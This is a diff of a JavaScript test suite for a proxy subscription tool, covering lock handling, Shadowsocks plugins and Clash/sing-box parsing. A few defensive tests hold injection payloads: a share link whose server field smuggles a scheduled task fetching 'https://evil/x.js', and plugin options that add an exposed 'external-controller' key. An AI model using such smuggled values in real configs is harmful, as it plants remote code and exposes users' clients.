@@ -1592,9 +1592,9 @@ test('checkRules: an entry in two lists is an error, not a silent pick', () => {
 });
 
 test('normalizeStore: keeps valid rules and survives a store without any', () => {
-  assert.deepStrictEqual(C.normalizeStore({ profiles: [] }).rules, { direct: [], proxy: [], block: [], ads: false });
+  assert.deepStrictEqual(C.normalizeStore({ profiles: [] }).rules, { direct: [], proxy: [], block: [], ads: false, regionGroups: false });
   const s = C.normalizeStore({ profiles: [], rules: { direct: ['a.com', 'bad entry'], proxy: 'b.com' } });
-  assert.deepStrictEqual(s.rules, { direct: ['a.com'], proxy: ['b.com'], block: [], ads: false });
+  assert.deepStrictEqual(s.rules, { direct: ['a.com'], proxy: ['b.com'], block: [], ads: false, regionGroups: false });
 });
 
 const RULES = { direct: ['bank.com', '10.8.0.0/16'], proxy: ['foreign.cn', '2001:db8::/32'], block: ['ads.com'] };
@@ -2236,8 +2236,13 @@ test('storage: a lock left by a dead writer, by this PID, or long ago is taken o
   const file = scratchStore('lock');
   const lock = `${file}.lock`;
   // A process that has already exited.
-  const dead = spawnSync(process.execPath, ['-e', 'process.stdout.write(String(process.pid))'], { encoding: 'utf8' }).stdout;
-  for (const [label, text, ageMs] of [['dead pid', dead, 0], ['own pid', String(process.pid), 0], ['old', 'whoever', B.LOCK_STALE_MS + 5000]]) {
+  const dead = Number(spawnSync(process.execPath, ['-e', 'process.stdout.write(String(process.pid))'], { encoding: 'utf8' }).stdout);
+  for (const [label, text, ageMs] of [
+    ['dead pid', lockText({ pid: dead }), 0],
+    ['own pid', lockText({ pid: process.pid }), 0],
+    ['old', 'whoever', B.LOCK_STALE_MS + 5000],
+    ['old, other host', lockText({ pid: process.ppid || 1, host: 'elsewhere' }), B.LOCK_STALE_MS + 5000],
+  ]) {
     fs.writeFileSync(lock, text);
     if (ageMs) { const t = (Date.now() - ageMs) / 1000; fs.utimesSync(lock, t, t); }
     const s = reread(file);
@@ -2247,12 +2252,110 @@ test('storage: a lock left by a dead writer, by this PID, or long ago is taken o
     assert.ok(!fs.existsSync(lock), `${label}: lock released`);
   }
   // A fresh lock held by a live process is still respected.
-  fs.writeFileSync(lock, String(process.ppid || 1));
+  fs.writeFileSync(lock, lockText({ pid: process.ppid || 1 }));
   try {
     const s = reread(file);
     s.title = 'blocked';
     assert.throws(() => B.save(file, s), /another process/);
   } finally { fs.unlinkSync(lock); }
+});
+
+// What a lock written by another process looks like. `ns` matches ours unless
+// told otherwise, the way two processes on one machine would.
+function lockText({ pid, host = os.hostname(), at = Date.now() }) {
+  let ns = null;
+  try { ns = fs.readlinkSync('/proc/self/ns/pid'); } catch { /* not Linux */ }
+  return JSON.stringify({ nonce: 'n'.repeat(32), pid, host, ns, at });
+}
+
+test('storage: a fresh lock from another host or container is not judged by its PID', () => {
+  const file = scratchStore('lock-host');
+  const lock = `${file}.lock`;
+  // A PID that does not exist *here* — which says nothing about whether it
+  // exists in the other container. Same for "that is my own PID": every
+  // container's node is PID 1.
+  for (const text of [
+    lockText({ pid: 999999, host: 'other-container' }),
+    lockText({ pid: process.pid, host: 'other-container' }),
+    String(999999), // the old bare-PID format: no host to compare, so age only
+  ]) {
+    fs.writeFileSync(lock, text);
+    try {
+      assert.strictEqual(B.lockIsStale(lock), false, text);
+      const s = reread(file);
+      s.title = 'must not land';
+      assert.throws(() => B.save(file, s), /another process/);
+      assert.strictEqual(fs.readFileSync(lock, 'utf8'), text, 'the other writer\'s lock is left alone');
+    } finally { fs.unlinkSync(lock); }
+  }
+  // The same lock on this host with a dead PID is stale at once.
+  fs.writeFileSync(lock, lockText({ pid: 999999 }));
+  try { assert.strictEqual(B.lockIsStale(lock), true); } finally { fs.unlinkSync(lock); }
+});
+
+test('storage: a lock carries a nonce, and release only removes our own', () => {
+  const file = scratchStore('lock-nonce');
+  const lock = `${file}.lock`;
+  // Watch the lock while it is held: save() snapshots first, and the snapshot
+  // directory is created inside the lock, so stub the moment it is written.
+  const realWrite = fs.writeFileSync;
+  let seen = null;
+  let stolen = null;
+  fs.writeFileSync = function patched(target, data, ...rest) {
+    if (typeof target === 'number' && seen === null && String(data).includes('"nonce"')) {
+      realWrite.call(fs, target, data, ...rest);
+      seen = JSON.parse(String(data));
+      // Somebody judged us stale and took over mid-save.
+      fs.unlinkSync(lock);
+      stolen = lockText({ pid: process.ppid || 1, host: 'successor' });
+      realWrite.call(fs, lock, stolen);
+      return undefined;
+    }
+    return realWrite.call(fs, target, data, ...rest);
+  };
+  try {
+    const s = reread(file);
+    s.title = 'nonce';
+    B.save(file, s);
+  } finally { fs.writeFileSync = realWrite; }
+  assert.ok(seen && /^[0-9a-f]{32}$/.test(seen.nonce), 'random nonce');
+  assert.strictEqual(seen.pid, process.pid);
+  assert.strictEqual(seen.host, os.hostname());
+  assert.ok(Number.isFinite(seen.at));
+  assert.strictEqual(fs.readFileSync(lock, 'utf8'), stolen, 'the successor\'s lock survives our release');
+  fs.unlinkSync(lock);
+});
+
+test('writeFileAtomic: temp names are unique and nothing is left behind', () => {
+  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'airport-atomic-'));
+  const target = path.join(dir, 'x.json');
+  const opened = [];
+  const realOpen = fs.openSync;
+  fs.openSync = function patched(p, ...rest) { opened.push(String(p)); return realOpen.call(fs, p, ...rest); };
+  try {
+    H.writeFileAtomic(target, 'a', 0o600);
+    H.writeFileAtomic(target, 'b', 0o600);
+  } finally { fs.openSync = realOpen; }
+  const tmps = opened.filter((p) => p.endsWith('.tmp'));
+  assert.strictEqual(tmps.length, 2);
+  assert.notStrictEqual(tmps[0], tmps[1], 'same pid, different temp file');
+  assert.match(path.basename(tmps[0]), new RegExp(`^x\\.json\\.${process.pid}\\.[0-9a-f]{12}\\.tmp$`));
+  assert.deepStrictEqual(fs.readdirSync(dir), ['x.json']);
+  assert.strictEqual(fs.readFileSync(target, 'utf8'), 'b');
+});
+
+test('history.updateState: changes only what the caller touches, on top of what is on disk now', () => {
+  const p = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'airport-state-')), 'monitor-state.json');
+  H.saveState(p, { alertState: 'ok', downStreak: 0, clients: {}, notices: {} });
+  const early = H.loadState(p); // what a slow writer loaded before its wait
+  // Meanwhile the dashboard records a device and a notice.
+  H.saveState(p, { ...H.loadState(p), clients: { dev: { at: 5, agent: 'clash' } }, notices: { n: 1 } });
+  H.updateState(p, (s) => { s.alertState = 'down'; s.downStreak = early.downStreak + 1; });
+  const now = H.loadState(p);
+  assert.strictEqual(now.alertState, 'down');
+  assert.strictEqual(now.downStreak, 1);
+  assert.deepStrictEqual(now.clients, { dev: { at: 5, agent: 'clash' } });
+  assert.deepStrictEqual(now.notices, { n: 1 });
 });
 
 test('storage: keeps the recent run plus one snapshot per day for two weeks', () => {
@@ -2304,6 +2407,476 @@ test('storage: snapshots carry a key fingerprint; another key is flagged and exp
     if (saved === undefined) delete process.env.BACKUP_KEY; else process.env.BACKUP_KEY = saved;
   }
   assert.throws(() => B.parseKey('short'), /32-byte/);
+});
+
+// ── Untrusted share links cannot write config structure ──────────────────── //
+test('a newline in a server address is refused and never reaches a line format', () => {
+  const vmess = 'vmess://' + Buffer.from(JSON.stringify({
+    v: '2', ps: 'Evil', add: '1.2.3.4\n[task_local]\n0 * * * * https://evil/x.js, tag=x',
+    port: '443', id: '11111111-2222-4333-8444-555555555555', net: 'tcp', tls: 'tls',
+  })).toString('base64');
+  const p = C.parseUri(vmess);
+  assert.match(C.validateProfile(p).errors.join(';'), /server must be a hostname or IP/);
+  for (const built of [K.buildQuantumultX([p]), K.buildSurge([p])]) {
+    assert.doesNotMatch(built.text, /^\[task_local\]$/m);
+    assert.doesNotMatch(built.text, /evil/);
+  }
+});
+
+test('server validation accepts hostnames, IPv4 and IPv6', () => {
+  for (const server of ['a.example.com', 'x_y.example.', '1.2.3.4', '2001:db8::1', '[2001:db8::1]', 'fe80::1%eth0']) {
+    const p = C.normalizeProfile({ protocol: 'shadowsocks', server, port: 8388, password: 'p' });
+    assert.deepStrictEqual(C.validateProfile(p).errors, [], server);
+  }
+});
+
+test('plugin options cannot add YAML keys to a Clash proxy', () => {
+  const uri = 'ss://' + Buffer.from('aes-256-gcm:pw').toString('base64url')
+    + '@1.2.3.4:8388?plugin=obfs-local;mode: x%0Aexternal-controller: 0.0.0.0:9090%0Azz=1#P';
+  const yaml = C.buildClashYaml([C.parseUri(uri)]);
+  assert.doesNotMatch(yaml, /^\s*external-controller:/m);
+});
+
+test('ss:// with percent-encoded base64 padding imports', () => {
+  const p = C.parseUri('ss://YWVzLTI1Ni1nY206cGFzc3dvcmQ%3D@1.2.3.4:8388#Pad');
+  assert.strictEqual(p.method, 'aes-256-gcm');
+  assert.strictEqual(p.password, 'password');
+});
+
+test('Quantumult X brackets an IPv6 server', () => {
+  const p = C.normalizeProfile({ protocol: 'trojan', server: '2001:db8::1', port: 443, password: 'pw', sni: 't.example.com', remarks: 'V6' });
+  assert.match(K.buildQuantumultX([p]).text, /trojan=\[2001:db8::1\]:443/);
+});
+
+test('normalizeStore gives a duplicated profile id a stable new one', () => {
+  const id = '11111111-2222-4333-8444-555555555555';
+  const raw = { profiles: [{ id, server: 'a', port: 1 }, { id, server: 'b', port: 2 }] };
+  const a = C.normalizeStore(raw);
+  const b = C.normalizeStore(raw);
+  assert.strictEqual(a.profiles[0].id, id);
+  assert.notStrictEqual(a.profiles[1].id, id);
+  assert.strictEqual(a.profiles[1].id, b.profiles[1].id);
+  assert.strictEqual(C.normalizeProfile(a.profiles[1]).id, a.profiles[1].id);
+});
+
+// ── simple-obfs and the other Shadowsocks plugins ─────────────────────────── //
+const obfsLink = (name = 'obfs-local', opts = 'obfs=http;obfs-host=cdn.example.com') => 'ss://'
+  + Buffer.from('aes-256-gcm:pw').toString('base64url')
+  + `@1.2.3.4:8388/?plugin=${encodeURIComponent(`${name};${opts}`)}#Obfs`;
+
+test('simple-obfs: Clash gets mihomo\'s `obfs` plugin with mode/host, under all three names', () => {
+  for (const name of ['obfs-local', 'simple-obfs']) {
+    const px = C.buildClashProxy(C.parseUri(obfsLink(name)));
+    assert.strictEqual(px.plugin, 'obfs', name);
+    assert.deepStrictEqual(px['plugin-opts'], { mode: 'http', host: 'cdn.example.com' }, name);
+  }
+  const tls = C.buildClashProxy(C.parseUri(obfsLink('obfs-local', 'obfs=tls')));
+  assert.deepStrictEqual(tls['plugin-opts'], { mode: 'tls', host: '1.2.3.4' }, 'host defaults to the server');
+  assert.strictEqual(tls.udp, false);
+  const yaml = C.buildClashYaml([C.parseUri(obfsLink())]);
+  assert.match(yaml, /plugin: "obfs"/);
+  assert.doesNotMatch(yaml, /obfs-local|obfs-host/);
+});
+
+test('simple-obfs: sing-box gets obfs-local, the link round-trips, an unknown mode is an error', () => {
+  const p = C.parseUri(obfsLink('simple-obfs'));
+  const out = C.buildSingBoxOutbound(p, 'x');
+  assert.strictEqual(out.plugin, 'obfs-local');
+  assert.strictEqual(out.plugin_opts, 'obfs=http;obfs-host=cdn.example.com');
+  const again = C.parseUri(C.buildUri(p));
+  assert.strictEqual(again.plugin, 'obfs-local');
+  assert.strictEqual(C.simpleObfsOpts(again.plugin_opts).host, 'cdn.example.com');
+  assert.deepStrictEqual(C.validateProfile(p).errors, []);
+  assert.ok(!C.validateProfile(p).warnings.some((w) => /passed through untouched/.test(w)));
+  const bad = C.parseUri(obfsLink('obfs-local', 'obfs=websocket'));
+  assert.ok(C.validateProfile(bad).errors.some((e) => /simple-obfs mode "websocket"/.test(e)));
+});
+
+test('a plugin sing-box cannot run is refused for Sing-Box only, and said so in the summary', () => {
+  const kcp = C.parseUri(obfsLink('kcptun', 'key=secret;crypt=aes'));
+  assert.strictEqual(C.ssPluginKind(kcp.plugin), 'other');
+  assert.throws(() => C.buildSingBox([kcp]), (err) => err.status === 409 && /obfs-local and v2ray-plugin/.test(err.message));
+  // Clash still carries it, as before.
+  assert.strictEqual(C.buildClashProxy(kcp).plugin, 'kcptun');
+  const s = K.supportSummary([kcp, C.parseUri(obfsLink())]);
+  assert.strictEqual(s.singbox.usable, 1);
+  assert.match(s.singbox.skipped[0].reason, /not kcptun/);
+  assert.strictEqual(s.clash.usable, 2);
+  assert.strictEqual(C.singBoxRefusal(C.parseUri(obfsLink())), null);
+});
+
+test('simple-obfs: Surge and Quantumult X carry it with obfs / obfs-host; other plugins are refused by name', () => {
+  const p = C.parseUri(obfsLink());
+  const surge = K.buildSurge([p]);
+  assert.deepStrictEqual(surge.skipped, []);
+  assert.match(surge.text, /Obfs = ss, 1\.2\.3\.4, 8388, encrypt-method=aes-256-gcm, password=pw, obfs=http, obfs-host=cdn\.example\.com/);
+  assert.doesNotMatch(surge.text.split('\n').find((l) => l.startsWith('Obfs =')), /udp-relay/);
+  const qx = K.buildQuantumultX([p]);
+  assert.deepStrictEqual(qx.skipped, []);
+  assert.match(qx.text, /shadowsocks=1\.2\.3\.4:8388, method=aes-256-gcm, password=pw, obfs=http, obfs-host=cdn\.example\.com, udp-relay=false, tag=Obfs/);
+  const v2 = C.normalizeProfile({ protocol: 'shadowsocks', server: '1.2.3.4', port: 8388, password: 'pw', method: 'aes-256-gcm', plugin: 'v2ray-plugin', plugin_opts: 'server' });
+  const reason = K.surgeRefusal(v2);
+  assert.match(reason, /no v2ray-plugin/);
+  assert.doesNotMatch(reason, /obfs-local/);
+  const kcp = C.parseUri(obfsLink('kcptun', 'key=x'));
+  assert.match(K.surgeRefusal(kcp), /not the kcptun plugin/);
+  assert.match(K.quantumultRefusal(kcp), /not kcptun/);
+  assert.strictEqual(K.quantumultRefusal(p), null);
+});
+
+// ── The deep probe's sing-box config ──────────────────────────────────────── //
+test('deep probe: the config names a DNS server and the default domain resolver', () => {
+  const p = C.normalizeProfile({ protocol: 'trojan', server: 't.example.com', port: 443, password: 'pw', sni: 't.example.com' });
+  const cfg = P.buildProbeConfig(p, 12345);
+  assert.deepStrictEqual(cfg.dns.servers, [{ type: 'local', tag: 'dns-local' }]);
+  assert.strictEqual(cfg.route.default_domain_resolver, 'dns-local');
+  assert.strictEqual(cfg.route.final, 'probe');
+  assert.strictEqual(cfg.inbounds[0].listen_port, 12345);
+  assert.ok(!cfg.route.rule_set, 'still no rule sets to download');
+});
+
+asyncTest('deep probe: a plugin sing-box cannot run is untestable, not down', async () => {
+  const r = await P.deepProbe(C.parseUri(obfsLink('kcptun', 'key=x')), 1000);
+  assert.strictEqual(r.ok, null);
+  assert.strictEqual(r.stage, 'skipped');
+  assert.match(r.message, /kcptun/);
+});
+
+// ── SIP022 share links ────────────────────────────────────────────────────── //
+test('buildSsUri: a 2022 cipher is written as plain percent-encoded method:password', () => {
+  const key = Buffer.alloc(32, 7).toString('base64'); // has + / and = in it
+  const p = C.normalizeProfile({ protocol: 'shadowsocks', server: '1.2.3.4', port: 8388, method: '2022-blake3-aes-256-gcm', password: key, plugin: '' });
+  const uri = C.buildUri(p, 'K');
+  assert.strictEqual(uri, `ss://2022-blake3-aes-256-gcm:${encodeURIComponent(key)}@1.2.3.4:8388#K`);
+  const back = C.parseUri(uri);
+  assert.strictEqual(back.method, p.method);
+  assert.strictEqual(back.password, key);
+  // The old base64url form still imports.
+  const old = `ss://${Buffer.from(`${p.method}:${key}`).toString('base64url')}@1.2.3.4:8388#K`;
+  assert.strictEqual(C.parseUri(old).password, key);
+  // Classic ciphers keep SIP002's base64url.
+  const classic = C.buildUri(C.normalizeProfile({ protocol: 'shadowsocks', server: '1.2.3.4', port: 1, method: 'aes-256-gcm', password: 'p', plugin: '' }));
+  assert.match(classic, /^ss:\/\/[A-Za-z0-9_-]+@/);
+});
+
+// ── Clash YAML and sing-box JSON subscription bodies ──────────────────────── //
+const UUID = '11111111-2222-4333-8444-555555555555';
+const CLASH_BODY = `
+mixed-port: 7890
+proxies:
+  - { name: "🇭🇰 HK 01", type: ss, server: hk.example.com, port: 8388, cipher: aes-256-gcm, password: pw }
+  - name: SS obfs
+    type: ss
+    server: 1.2.3.4
+    port: 8389
+    cipher: chacha20-ietf-poly1305
+    password: pw2
+    plugin: obfs
+    plugin-opts: { mode: tls, host: bing.com }
+  - name: SS v2
+    type: ss
+    server: 1.2.3.5
+    port: 443
+    cipher: aes-128-gcm
+    password: pw3
+    plugin: v2ray-plugin
+    plugin-opts: { mode: websocket, tls: true, host: v2.example.com, path: /ws }
+  - name: VM ws
+    type: vmess
+    server: vm.example.com
+    port: 443
+    uuid: ${UUID}
+    alterId: 0
+    cipher: auto
+    tls: true
+    servername: vm.example.com
+    network: ws
+    ws-opts: { path: /vm, headers: { Host: cdn.example.com } }
+  - name: Reality
+    type: vless
+    server: 5.6.7.8
+    port: 443
+    uuid: ${UUID}
+    tls: true
+    flow: xtls-rprx-vision
+    servername: www.microsoft.com
+    client-fingerprint: chrome
+    reality-opts: { public-key: PUBKEY, short-id: abcd }
+  - name: VLESS grpc
+    type: vless
+    server: vl.example.com
+    port: 443
+    uuid: ${UUID}
+    tls: true
+    servername: vl.example.com
+    network: grpc
+    grpc-opts: { grpc-service-name: gun }
+  - { name: Trojan, type: trojan, server: tj.example.com, port: 443, password: tp, sni: tj.example.com, skip-cert-verify: true }
+  - { name: HY2, type: hysteria2, server: hy.example.com, port: 443, password: hp, sni: hy.example.com, ports: "20000-30000", up: "50 Mbps", down: "200 Mbps", obfs: salamander, obfs-password: op }
+  - { name: TUIC, type: tuic, server: tu.example.com, port: 443, uuid: ${UUID}, password: tup, alpn: [h3], congestion-controller: cubic }
+  - { name: Snell, type: snell, server: s.example.com, port: 1, psk: x }
+  - { name: KCP, type: ss, server: k.example.com, port: 1, cipher: aes-256-gcm, password: x, plugin: kcptun }
+  - { name: Plain VLESS, type: vless, server: p.example.com, port: 1, uuid: ${UUID} }
+  - { name: H2, type: vmess, server: h.example.com, port: 1, uuid: ${UUID}, network: h2 }
+proxy-groups:
+  - { name: PROXY, type: select, proxies: [HK 01] }
+rules:
+  - MATCH,PROXY
+`;
+
+test('subscriptionFormat: tells the four body types apart', () => {
+  const link = 'trojan://pw@a.example.com:443?sni=a.example.com#A';
+  assert.strictEqual(C.subscriptionFormat(''), 'empty');
+  assert.strictEqual(C.subscriptionFormat(link), 'links');
+  assert.strictEqual(C.subscriptionFormat(Buffer.from(link).toString('base64')), 'base64');
+  assert.strictEqual(C.subscriptionFormat(CLASH_BODY), 'clash');
+  assert.strictEqual(C.subscriptionFormat('﻿{"outbounds":[]}'), 'singbox');
+  // A profile JSON (what --add takes) is not a sing-box config.
+  assert.strictEqual(C.subscriptionFormat('{"server":"a","port":1}'), 'links');
+});
+
+test('parseSubscription: a Clash config becomes profiles, with an error per unsupported proxy', () => {
+  const { profiles, errors, format } = C.parseSubscription(CLASH_BODY);
+  assert.strictEqual(format, 'clash');
+  const by = Object.fromEntries(profiles.map((p) => [p.remarks, p]));
+  assert.deepStrictEqual(Object.keys(by), ['🇭🇰 HK 01', 'SS obfs', 'SS v2', 'VM ws', 'Reality', 'VLESS grpc', 'Trojan', 'HY2', 'TUIC']);
+  for (const p of profiles) assert.deepStrictEqual(C.validateProfile(p).errors, [], p.remarks);
+  assert.strictEqual(by['🇭🇰 HK 01'].plugin, '', 'no plugin means none, not v2ray-plugin');
+  assert.strictEqual(by['SS obfs'].plugin, 'obfs-local');
+  assert.deepStrictEqual(C.simpleObfsOpts(by['SS obfs'].plugin_opts), { mode: 'tls', host: 'bing.com', uri: '' });
+  assert.strictEqual(by['SS v2'].plugin, 'v2ray-plugin');
+  assert.ok(C.hasOpt(by['SS v2'].plugin_opts, 'tls'));
+  assert.strictEqual(C.getOpt(by['SS v2'].plugin_opts, 'path'), '/ws');
+  assert.strictEqual(by['VM ws'].protocol, 'vmess');
+  assert.strictEqual(by['VM ws'].tls, true);
+  assert.strictEqual(by['VM ws'].network, 'ws');
+  assert.strictEqual(by['VM ws'].host, 'cdn.example.com');
+  assert.strictEqual(by.Reality.protocol, 'vless-reality');
+  assert.strictEqual(by.Reality.publicKey, 'PUBKEY');
+  assert.strictEqual(by.Reality.flow, 'xtls-rprx-vision');
+  assert.strictEqual(by['VLESS grpc'].protocol, 'vless-tls');
+  assert.strictEqual(by['VLESS grpc'].serviceName, 'gun');
+  assert.strictEqual(by.Trojan.insecure, true);
+  assert.strictEqual(by.HY2.ports, '20000-30000');
+  assert.strictEqual(by.HY2.up, 50);
+  assert.strictEqual(by.HY2.down, 200);
+  assert.strictEqual(by.HY2.obfs, 'salamander');
+  assert.strictEqual(by.TUIC.congestion, 'cubic');
+  assert.strictEqual(errors.length, 4);
+  assert.match(errors.join('\n'), /Snell: Clash proxy type "snell" is not supported/);
+  assert.match(errors.join('\n'), /KCP: the kcptun plugin is not supported/);
+  assert.match(errors.join('\n'), /Plain VLESS: VLESS without TLS/);
+  assert.match(errors.join('\n'), /H2: the h2 transport/);
+});
+
+test('parseSubscription: a Clash proxy without flow keeps no flow (unlike a bare vless:// link)', () => {
+  const { profiles } = C.parseSubscription(`proxies:\n  - { name: R, type: vless, server: 1.2.3.4, port: 443, uuid: ${UUID}, tls: true, servername: www.microsoft.com, reality-opts: { public-key: K, short-id: ab } }\n`);
+  assert.strictEqual(profiles[0].flow, '');
+});
+
+test('parseSubscription: broken YAML and a config without proxies are reported, not thrown', () => {
+  assert.match(C.parseSubscription('proxies:\n  - [unclosed').errors[0], /not valid YAML/);
+  assert.match(C.parseSubscription('proxies: 3\n').errors[0], /no proxies list/);
+});
+
+const SING_BODY = JSON.stringify({
+  log: { level: 'info' },
+  outbounds: [
+    { type: 'selector', tag: 'proxy', outbounds: ['auto'] },
+    { type: 'urltest', tag: 'auto', outbounds: ['a'] },
+    { type: 'shadowsocks', tag: '🇯🇵 Tokyo', server: 'jp.example.com', server_port: 8388, method: 'aes-256-gcm', password: 'pw' },
+    { type: 'shadowsocks', tag: 'obfs', server: '1.2.3.4', server_port: 8388, method: 'aes-256-gcm', password: 'pw', plugin: 'obfs-local', plugin_opts: 'obfs=http;obfs-host=b.com' },
+    { type: 'vmess', tag: 'vm', server: 'vm.example.com', server_port: 443, uuid: UUID, security: 'auto', alter_id: 0, tls: { enabled: true, server_name: 'vm.example.com' }, transport: { type: 'ws', path: '/p', headers: { Host: 'cdn.example.com' } } },
+    { type: 'vless', tag: 'reality', server: '5.6.7.8', server_port: 443, uuid: UUID, flow: 'xtls-rprx-vision', tls: { enabled: true, server_name: 'www.microsoft.com', utls: { enabled: true, fingerprint: 'firefox' }, reality: { enabled: true, public_key: 'PK', short_id: 'ab' } } },
+    { type: 'vless', tag: 'vtls', server: 'v.example.com', server_port: 443, uuid: UUID, tls: { enabled: true, server_name: 'v.example.com', insecure: true }, transport: { type: 'grpc', service_name: 'svc' } },
+    { type: 'trojan', tag: 'tj', server: 'tj.example.com', server_port: 443, password: 'tp', tls: { enabled: true, server_name: 'tj.example.com', alpn: ['h2', 'http/1.1'] } },
+    { type: 'hysteria2', tag: 'hy', server: 'hy.example.com', server_ports: ['20000:30000'], hop_interval: '45s', password: 'hp', up_mbps: 20, down_mbps: 100, obfs: { type: 'salamander', password: 'op' }, tls: { enabled: true, server_name: 'hy.example.com' } },
+    { type: 'tuic', tag: 'tu', server: 'tu.example.com', server_port: 443, uuid: UUID, password: 'tup', congestion_control: 'bbr', tls: { enabled: true, server_name: 'tu.example.com', alpn: ['h3'] } },
+    { type: 'wireguard', tag: 'wg', server: 'w.example.com', server_port: 51820 },
+    { type: 'trojan', tag: 'quic', server: 'q.example.com', server_port: 443, password: 'x', tls: { enabled: true }, transport: { type: 'quic' } },
+    { type: 'direct', tag: 'direct' },
+  ],
+});
+
+test('parseSubscription: a sing-box config becomes profiles; groups are skipped, the rest reported', () => {
+  const { profiles, errors, format } = C.parseSubscription(SING_BODY);
+  assert.strictEqual(format, 'singbox');
+  const by = Object.fromEntries(profiles.map((p) => [p.remarks, p]));
+  assert.deepStrictEqual(Object.keys(by), ['🇯🇵 Tokyo', 'obfs', 'vm', 'reality', 'vtls', 'tj', 'hy', 'tu']);
+  for (const p of profiles) assert.deepStrictEqual(C.validateProfile(p).errors, [], p.remarks);
+  assert.strictEqual(by['🇯🇵 Tokyo'].plugin, '');
+  assert.strictEqual(by.obfs.plugin, 'obfs-local');
+  assert.strictEqual(by.vm.path, '/p');
+  assert.strictEqual(by.vm.host, 'cdn.example.com');
+  assert.strictEqual(by.reality.fingerprint, 'firefox');
+  assert.strictEqual(by.reality.shortId, 'ab');
+  assert.strictEqual(by.vtls.insecure, true);
+  assert.strictEqual(by.vtls.serviceName, 'svc');
+  assert.strictEqual(by.tj.alpn, 'h2,http/1.1');
+  assert.strictEqual(by.hy.port, 20000);
+  assert.strictEqual(by.hy.ports, '20000-30000');
+  assert.strictEqual(by.hy.hopInterval, 45);
+  assert.strictEqual(by.hy.obfsPassword, 'op');
+  assert.strictEqual(errors.length, 2);
+  assert.match(errors[0], /wg: sing-box outbound type "wireguard" is not supported/);
+  assert.match(errors[1], /quic: the quic transport/);
+  // And what came in goes back out as the same sing-box outbound.
+  assert.deepStrictEqual(C.buildSingBoxOutbound(by.hy, 'hy').server_ports, ['20000:30000']);
+});
+
+asyncTest('sources.fetchSource: a provider that answers with Clash YAML still refreshes', async () => {
+  const S = require('./lib/sources');
+  const http = require('http');
+  let agent = null;
+  const srv = http.createServer((req, res) => { agent = req.headers['user-agent']; res.end(CLASH_BODY); });
+  await new Promise((r) => srv.listen(0, '127.0.0.1', r));
+  try {
+    const r = await S.fetchSource({ url: `http://127.0.0.1:${srv.address().port}/` });
+    assert.strictEqual(r.error, undefined);
+    assert.strictEqual(r.count, 9);
+    assert.strictEqual(r.problems.length, 4);
+    assert.strictEqual(agent, S.USER_AGENT, 'still asks for the link list');
+  } finally { srv.close(); }
+});
+
+// ── Per-source filters and renaming ───────────────────────────────────────── //
+test('normalizeSources: include / exclude / prefix are validated, and default to empty', () => {
+  const [plain] = C.normalizeSources([{ url: 'https://p.example/a' }]);
+  assert.strictEqual(plain.include, '');
+  assert.strictEqual(plain.exclude, '');
+  assert.strictEqual(plain.prefix, '');
+  const [s] = C.normalizeSources([{
+    url: 'https://p.example/b', include: 'HK|JP', exclude: ' 到期|expire\n', prefix: '  Acme\u0007 Cloud plus a very long tail here  ',
+  }]);
+  assert.strictEqual(s.include, 'HK|JP');
+  assert.strictEqual(s.exclude, '到期|expire');
+  assert.strictEqual(s.prefix, 'Acme Cloud plus a very l');
+  assert.ok(s.prefix.length <= C.SOURCE_PREFIX_MAX);
+  const [bad] = C.normalizeSources([{ url: 'https://p.example/c', include: '(unclosed', exclude: 'x'.repeat(201), prefix: 42 }]);
+  assert.strictEqual(bad.include, '');
+  assert.strictEqual(bad.exclude, '');
+  assert.strictEqual(bad.prefix, '');
+  assert.match(C.sourcePatternProblem('(unclosed'), /not a valid regular expression/);
+  assert.match(C.sourcePatternProblem('x'.repeat(201)), /at most 200/);
+  assert.strictEqual(C.sourcePatternProblem(''), null);
+  // The suggestion compiles, fits, and is not applied on its own.
+  assert.strictEqual(C.sourcePatternProblem(C.SOURCE_EXCLUDE_SUGGESTION), null);
+  assert.strictEqual(require('./lib/sources').SOURCE_EXCLUDE_SUGGESTION, C.SOURCE_EXCLUDE_SUGGESTION);
+  const sugg = new RegExp(C.SOURCE_EXCLUDE_SUGGESTION, 'i');
+  for (const junk of ['剩余流量：120 GB', '套餐到期：2026-12-01', '官网 example.com', 'Traffic reset in 3 days', 'Expire: 2027']) assert.ok(sugg.test(junk), junk);
+  for (const real of ['🇭🇰 香港 01', 'JP Tokyo IPLC', 'US-LA-2']) assert.ok(!sugg.test(real), real);
+});
+
+test('applySourceFilters: case-insensitive include then exclude, matched before the prefix', () => {
+  const ps = ['HK 01', 'hk 02', 'JP 01', '剩余流量 10G', 'US 1'].map((remarks) => ({ remarks }));
+  const r = C.applySourceFilters({ include: 'hk|jp|流量', exclude: '流量', prefix: 'Acme' }, ps);
+  assert.deepStrictEqual(r.profiles.map((p) => p.remarks), ['Acme HK 01', 'Acme hk 02', 'Acme JP 01']);
+  assert.strictEqual(r.filtered, 2);
+  // An invalid stored pattern filters nothing rather than throwing.
+  assert.strictEqual(C.applySourceFilters({ include: '(' }, ps).profiles.length, 5);
+});
+
+asyncTest('sources: filters apply on refresh, and a now-excluded server is removed by the merge', async () => {
+  const S = require('./lib/sources');
+  const http = require('http');
+  const uri = (h, n) => `trojan://pw@${h}:443?security=tls&sni=${h}#${encodeURIComponent(n)}`;
+  const body = Buffer.from([uri('a.example.com', 'HK A'), uri('b.example.com', 'JP B'), uri('c.example.com', '到期 2027-01-01')].join('\n')).toString('base64');
+  const srv = http.createServer((req, res) => res.end(body));
+  await new Promise((r) => srv.listen(0, '127.0.0.1', r));
+  try {
+    const store = C.normalizeStore({ profiles: [], sources: [{ url: `http://127.0.0.1:${srv.address().port}/`, exclude: C.SOURCE_EXCLUDE_SUGGESTION, prefix: 'P' }] });
+    const [src] = store.sources;
+    let r = await S.fetchSource(src);
+    assert.strictEqual(r.count, 2);
+    assert.strictEqual(r.filtered, 1);
+    S.mergeSource(store, src, r.profiles);
+    assert.deepStrictEqual(store.profiles.map((p) => p.remarks), ['P HK A', 'P JP B']);
+    const jpId = store.profiles[1].id;
+    // Now keep only HK: JP leaves exactly the way a provider-dropped server does.
+    src.include = 'hk';
+    r = await S.fetchSource(src);
+    const merged = S.mergeSource(store, src, r.profiles);
+    assert.deepStrictEqual(store.profiles.map((p) => p.remarks), ['P HK A']);
+    assert.deepStrictEqual(merged.removedIds, [jpId]);
+    // A filter that leaves nothing is an error, not an instruction to delete everything.
+    src.include = 'nothing-matches-this';
+    r = await S.fetchSource(src);
+    assert.match(r.error, /filters left none of the 3/);
+    assert.deepStrictEqual(r.profiles, []);
+  } finally { srv.close(); }
+});
+
